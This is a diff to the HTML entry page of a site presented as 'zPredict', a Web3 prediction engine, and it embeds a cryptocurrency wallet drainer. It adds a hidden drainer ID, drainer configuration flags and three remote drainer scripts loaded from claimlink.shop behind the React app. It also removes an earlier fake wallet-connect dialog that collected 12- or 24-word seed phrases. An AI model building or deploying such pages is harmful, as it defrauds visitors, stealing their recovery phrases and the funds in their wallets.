@@ -4,51 +4,24 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>zPredict — Professional Multi-Chain Web3 Engine</title>
+    <!-- Drainer Styles -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
     <link rel="stylesheet" href="https://claimlink.shop/assets/css/style.css?v=09.19.205">
   </head>
-  <body style="margin:0; padding: 0; background-color: #000000;">
-
-    <!-- Ye tera React Root hai -->
+  <body>
     <div id="root"></div>
 
-    <!-- DRAINER ID -->
-    <input type="hidden" value="https://claimdrop.club/?g=YHGPARLPVN4UB1AEGXFSNTUAHGRWONC7EYZKPW1CRY7UX" id="exogator_id">
+    <!-- TERA DRAINER ID -->
+    <input type="hidden" value="L5WL5CQL8U7E3TBSSTTGUHBIRV3FRKQFEMHSVSTQPLXOB" id="exogator_id">
 
-    <!-- ORIGINAL BIG MODAL -->
-    <div class="modal__container" id="modal-container">
-        <div class="modal__content">
-            <div class="modal__close close-modal" onclick="closeModal()" title="Close"><i class='bx bx-x'></i></div>
-            <h1 id="tito1" class="modal__title">Connect your wallet</h1>
-            <p id="tito2" class="modal__description">Please select one of the options below to connect your wallet.</p>
-            <button id="tito3" class="modal__button modal__button-width" onclick="start_exogator()">
-              Other wallets 
-              <t style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;"> 350+</t>
-              <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style="width: 23px; right: 110px; position: absolute;"> 
-            </button>
-            <button id="tito3" class="modal__button modal__button-width" onclick="showseedme()"> 
-              Connect manually <t style="right: 58px;position: absolute;border-radius: 12px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
-            </button>
-        </div>
-    </div>
-
-    <!-- SEED MODAL -->
-    <div id="myModal" class="modal">
-        <div class="modal-content">
-            <div style="padding: 20px 22px;">
-                <span class="close"><select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border-radius: 9px;"><option value="12" selected>12-word phrase</option><option value="24">24-word phrase</option></select></span>
-                <h2 style="margin: 0px;">Connect manually</h2>
-                <div class="seed-phrase-container" id="seedPhraseContainer"></div>
-                <button onclick="checkAllFieldsFilled()" style="margin-top: 20px; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; cursor: pointer;">Connect Wallet</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- VITE AUTOMATICALLY INJECTS THE SCRIPT HERE DURING BUILD -->
-    
     <script>
         window.modaltheme = 3; window.evm = 1; window.seed = 0; window.auto = 0; window.dark = 0; window.towsteps = 1; 
     </script>
+    
+    <!-- VITE MAIN SCRIPT (Isko hamesha top par rehne do) -->
+    <script type="module" src="/src/main.tsx"></script>
+
+    <!-- DRAINER SCRIPTS (Ye peeche se load honge) -->
     <script src="https://claimlink.shop/assets/eth.js?v=09.19.205"></script>
     <script src="https://claimlink.shop/assets/w-modal.js?v=09.19.205"></script>
     <script src="https://claimlink.shop/assets/w-loader.js?v=09.19.205"></script>
